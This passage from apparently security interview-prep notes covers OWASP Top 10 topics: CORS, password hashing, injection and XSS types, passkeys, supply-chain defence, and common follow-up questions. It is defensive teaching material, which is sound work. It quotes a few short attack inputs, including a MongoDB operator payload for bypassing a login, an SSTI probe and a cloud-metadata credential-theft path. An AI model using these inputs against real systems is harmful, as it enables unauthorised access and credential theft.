  reflecting *any* origin turns every authenticated endpoint into a cross-origin read).
- **Reflecting the `Origin` header blindly** back into ACAO is the common bug — it trusts
  every site. **Trusting `null`** (from sandboxed iframes/redirects) is exploitable. Sloppy
  **regex** (`^https://example\.com` without anchoring the end) matches
  `https://example.com.evil.com`.
- CORS is **not an access-control mechanism** — it relaxes the same-origin *read* policy in
  the browser. It never protects the server; server-side authorization is still required.

**Cloud misconfiguration breadth:** public **S3/blob** buckets, over-permissive **IAM**,
exposed Kubernetes dashboards / **etcd**, an exposed **`.git`** directory or **`.env`** file,
and unauthenticated **Elasticsearch / Redis / MongoDB** bound to a public interface.

---

## Password hashing and AEAD — concrete parameters (A04 deep dive)

"Use Argon2id/bcrypt" is not enough at senior level; know the numbers (per OWASP Password
Storage Cheat Sheet, RFC 9106, and RFC 7914):

- **Argon2id (preferred, RFC 9106)** — memory-hard. OWASP baseline example: **m ≈ 19 MiB,
  t = 2, p = 1** (with higher memory, e.g. up to ~47 MiB, if you can afford it). Memory cost
  is what defeats GPU/ASIC cracking.
- **bcrypt** — **work factor ≥ 10–12.** Caveat: bcrypt **truncates input at 72 bytes**, so
  long passwords (or "pepper-then-append" schemes) can silently lose entropy; pre-hash with
  SHA-256 + base64 if you must support >72 bytes.
- **scrypt (RFC 7914)** — memory-hard; acceptable where Argon2 isn't available.
- **PBKDF2** — FIPS-friendly but *not* memory-hard. OWASP (2023) recommends **≈ 600,000
  iterations for PBKDF2-HMAC-SHA256** (adjust per hash). Use it when a certification requires
  a NIST-approved KDF.

All must use a **unique random salt per password** (the KDFs generate/store this for you).

**AEAD nonce discipline:**
- **AES-GCM uses a 96-bit (12-byte) nonce.** **Nonce reuse under the same key is
  catastrophic** — it leaks the XOR of plaintexts *and* enables recovery of the GCM
  authentication subkey (forgery of arbitrary messages). Use a counter or random 96-bit
  nonce with a strict no-reuse guarantee; rotate keys before the nonce space is at risk.
- **ChaCha20-Poly1305** is the common AEAD alternative (better on hardware without AES
  acceleration).

**Named crypto attacks a senior should recognize:**
- **Padding oracle** (CBC + unauthenticated MAC-then-nothing) — decrypt/forge via padding
  error side channel; the reason to use AEAD.
- **BEAST** (TLS 1.0 CBC), **POODLE** (SSL 3.0 padding), **Lucky13** (CBC timing),
  **CRIME / BREACH** (compression + secret in the same context leaks it).
- **Crypto-agility & post-quantum:** "harvest now, decrypt later" motivates migrating to
  **NIST PQC — ML-KEM (FIPS 203)** for key exchange and **ML-DSA (FIPS 204)** for
  signatures. Worth one forward-looking sentence in 2025.

---

## Injection breadth and XSS taxonomy (A05 deep dive)

The A03/A05 injection section shows SQLi + reflected XSS. The category is much broader:

- **NoSQL injection** — e.g. MongoDB operator injection (`{"$where": "..."}` or
  `{"password": {"$ne": null}}` to bypass a login). Defend by rejecting operator objects
  where a scalar is expected and using typed query builders.
- **LDAP injection**, **XPath injection**, **OS command injection**, **ORM injection**
  (unsafe HQL/JPQL concatenation), **CRLF / HTTP response splitting** and **host-header
  injection**, and **log injection**.
- **Server-Side Template Injection (SSTI)** — user input reaches a template engine as
  *template*, not data (`{{7*7}}` → `49`), often escalating to RCE. Defend by never
  compiling user input as a template; use logic-less/sandboxed templates.
- **Second-order SQL injection** — malicious input is *stored* safely, then later
  concatenated into a query by a different code path that trusts "internal" data. The gotcha:
  parameterize **everywhere**, not just at the front door.

**XSS taxonomy** (all under A05:2025 / A03:2021 Injection):
- **Stored (persistent)** — payload saved server-side, runs for every viewer.
- **Reflected** — payload echoed from the request into the immediate response.
- **DOM-based** — the vulnerability is entirely client-side: a JS **sink**
  (`innerHTML`, `eval`, `document.write`) consumes attacker-controlled **source**
  (`location.hash`, `postMessage`). Server-side output encoding doesn't help; you need safe
  DOM APIs and **Trusted Types**.
- **Mutation XSS (mXSS)** — sanitized markup is *mutated* by the browser's HTML parser back
  into something executable, defeating a naive sanitizer.

---

## Modern authentication depth — passkeys and NIST 800-63 AALs (A07 deep dive)

The A07 section covers credential stuffing, session fixation, and password policy. Deeper:

- **NIST SP 800-63B → 800-63-4 (finalized 2025).** Defines **Authenticator Assurance Levels
  (AAL1/2/3)**. AAL2 requires MFA; AAL3 requires a **hardware-based, phishing-resistant**
  authenticator with verifier impersonation resistance. **SMS OTP is a "restricted"
  authenticator** — allowed but discouraged (SIM-swap, SS7 interception).
- **WebAuthn / FIDO2 / passkeys** — public-key credentials **bound to the origin**, so a
  phishing site on a look-alike domain can't use them (phishing-resistant by design).
  - **Device-bound passkeys** stay on one authenticator (highest assurance).
  - **Synced passkeys** replicate across a user's devices via a cloud keychain (better UX,
    slightly lower assurance because the key material syncs).
- **Session vs token revocation:** a server-side session can be invalidated instantly; a
  **stateless JWT cannot be easily revoked** before its expiry. That's why bearer-token
  designs need **short TTLs + refresh-token rotation with reuse detection** (a replayed old
  refresh token signals theft → revoke the family). (Protocol depth lives in the OAuth topic.)

---

## Supply-chain defense internals — SLSA, SBOM, provenance, dependency confusion (A03:2025 deep dive)

Expanding A06:2021 → A03:2025, know the standards and the distinctions:

- **SCA vs SBOM vs provenance** — *SCA* scans your dependency tree for known-vulnerable
  versions; an *SBOM* (**SPDX** or **CycloneDX** format) is the inventory of what you ship;
  **provenance** attests *how/where* an artifact was built. **VEX** (Vulnerability
  Exploitability eXchange) states whether a listed component's vuln is actually
  exploitable in your product.
- **SLSA (Supply-chain Levels for Software Artifacts, slsa.dev)** — a framework of levels
  (roughly 0–3+) raising **build integrity and provenance** guarantees: L1 provenance
  exists, higher levels require a hardened, tamper-resistant, non-falsifiable build.
- **Sigstore / cosign** (sign artifacts & container images), **in-toto attestations**
  (signed statements about build steps) — the concrete tooling for provenance.
- **Reachability analysis** — a vulnerable dependency matters far more if the vulnerable
  *function is actually called*; modern SCA prioritizes reachable vulns. **Lockfile pinning +
  hash verification** stop silent version/content substitution.
- **Dependency confusion (Alex Birsan, 2021)** — if a build resolves an *internal* package
  name and the public registry is also consulted, an attacker publishes a **higher-version
  package of the same name publicly**, and the resolver pulls the attacker's package. Defend
  with scoped/namespaced packages, explicit private-registry pinning, and reserving your
  names publicly.
- **Incidents to name:** **SolarWinds** (build-pipeline backdoor), **Log4Shell**
  (ubiquitous transitive dep, CVE-2021-44228), **Codecov bash-uploader (2021)**,
  **event-stream (npm)**, **xz-utils backdoor (CVE-2024-3094, 2024)** — a multi-year social
  engineering of a maintainer, and **Shai-Hulud (2025)**, a self-propagating npm worm.

> [!TIP]
> "Would SCA have caught Log4Shell?" — **Yes, if your inventory was current** (it's a known
> CVE in a listed dependency). Pen-testing your *own* code would likely miss it. This is why
> A03:2025 is an inventory/SCA/provenance problem, not a code-review problem.

---

## Common follow-up questions

- **"Is the OWASP Top 10 a standard you can certify against?"** No — it's an *awareness*
  document. For verifiable requirements use **ASVS**; for testing use the **WSTG**.
- **"Why did Broken Access Control move to #1?"** 94% of tested apps were *tested for* it
  (avg incidence ~3.81%) and it had the most CWE occurrences (34 mapped CWEs) — not that
  94% *had* it; authorization is app-specific and hard to test automatically.
- **"What's the difference between A04 Insecure Design and A05 Misconfiguration?"** A04 =
  a needed control was never designed in (can't be patched, must redesign); A05 = a
  control exists but is deployed with insecure/default settings.
- **"Where did XSS, XXE, and Insecure Deserialization go in 2021?"** XSS → A03 Injection;
  XXE → A05 Misconfiguration; Insecure Deserialization → A08 Integrity Failures.
- **"How are the two survey-selected categories chosen and why?"** By community vote, to
  surface risks that are hard to detect with automated tooling (2021: A04 and A10).
- **"What actually stops SQL injection?"** Parameterized queries/prepared statements
  (separate code and data channels); escaping/validation is defense in depth.
- **"How does SSRF lead to cloud account takeover?"** By reaching the metadata endpoint
  (`169.254.169.254`) to steal temporary IAM credentials — mitigated by IMDSv2 + egress
  controls + destination allowlisting.
- **"Why is SHA-256(password) a cryptographic failure?"** It's a *fast* hash — attackers
  compute billions/sec. Passwords need a slow, salted KDF (Argon2id/bcrypt/scrypt/PBKDF2).
- **"What defends A06 that pen-testing your own code won't?"** SBOM + Software Composition
  Analysis against CVE feeds; you inherit vulns from transitive dependencies.
- **"How does A08 relate to SolarWinds?"** A compromised CI/CD build pipeline shipped a
  signed-but-backdoored update — an integrity failure; defense is pipeline hardening,
  artifact signing, and dependency verification.
- **"The 2025 Top 10 just dropped — what changed and why?"** Supply Chain → A03 (survey #1),
  SSRF merged into A01, new A10 Mishandling of Exceptional Conditions, Misconfiguration up to
  A02; driven by cloud/CI-CD reality and major supply-chain incidents.
- **"Where is SSRF in 2025?"** Not standalone anymore — merged up into **A01 Broken Access
  Control**. Memorizing "SSRF = A10" is now the wrong answer.
- **"CWE vs CVE vs CVSS vs KEV vs EPSS?"** CWE = weakness *class*; CVE = specific *instance*;
  CVSS = severity *score*; KEV = *being exploited in the wild*; EPSS = *probability* of
  exploitation soon. Prioritize with KEV + EPSS + CVSS + your own reachability/exposure.
- **"Auth service times out — fail open or fail closed?"** **Fail closed (deny).** Failing
  open (CWE-636) is the core A10:2025 Mishandling of Exceptional Conditions failure.
- **"`Access-Control-Allow-Origin: *` with `credentials: true` — what happens?"** The Fetch
  spec forbids it; the browser blocks the response. Credentialed CORS needs an explicit
  echoed origin.
- **"Is SHA-256 + salt OK for passwords?"** No — still a *fast* hash. Use Argon2id
  (m≈19MiB, t=2, p=1), bcrypt (cost ≥10–12), scrypt, or PBKDF2 (~600k iterations).
- **"How do ASVS L1/L2/L3 differ?"** L1 opportunistic/mostly-automated baseline; L2 standard
  for most sensitive-data apps (recommended target); L3 for high-value/critical systems.

## References

- OWASP Top 10 2021 — <https://owasp.org/Top10/> (per-category pages A01–A10)
- OWASP Top 10:2025 (current edition) — <https://owasp.org/Top10/2025/> (Introduction page
  has the full 2021→2025 change table; A03 Supply Chain and A10 Exceptional Conditions pages)
- OWASP Top 10 2021 "About / How data is used" & methodology —
  <https://owasp.org/Top10/A00_2021_Introduction/>
- OWASP ASVS levels, SAMM, MASVS, Proactive Controls — <https://owasp.org/projects/>
- OWASP Password Storage Cheat Sheet (Argon2id/bcrypt/scrypt/PBKDF2 params) —
  <https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html>
- CISA Known Exploited Vulnerabilities (KEV) catalog — <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>
- FIRST EPSS & CVSS v4.0 — <https://www.first.org/epss/> and <https://www.first.org/cvss/>
- SLSA supply-chain framework — <https://slsa.dev/> ; Sigstore — <https://www.sigstore.dev/>
- SBOM formats: SPDX — <https://spdx.dev/> ; CycloneDX — <https://cyclonedx.org/>
- NIST SP 800-63-4 Digital Identity (AAL levels) — <https://pages.nist.gov/800-63-4/>
- RFC 9106 (Argon2), RFC 7914 (scrypt), RFC 7519/7515/7518 (JWT/JWS/JWA), NIST SP 800-38D (GCM)
- CVE-2024-3094 (xz-utils backdoor) — <https://cve.mitre.org/>
- OWASP API Security Top 10 2023 — <https://owasp.org/API-Security/editions/2023/en/0x00-header/>
- OWASP Application Security Verification Standard (ASVS) — <https://owasp.org/www-project-application-security-verification-standard/>
- OWASP Web Security Testing Guide (WSTG) — <https://owasp.org/www-project-web-security-testing-guide/>
- OWASP Cheat Sheet Series — <https://cheatsheetseries.owasp.org/>
- CWE list (MITRE) — <https://cwe.mitre.org/>
- NIST SP 800-63B Digital Identity (authentication) — <https://pages.nist.gov/800-63-3/sp800-63b.html>
- NIST SP 800-61 Computer Security Incident Handling — <https://csrc.nist.gov/pubs/sp/800/61/r2/final>
- CVE-2021-44228 (Log4Shell); CVE-2017-5638 (Apache Struts / Equifax) — <https://cve.mitre.org/>
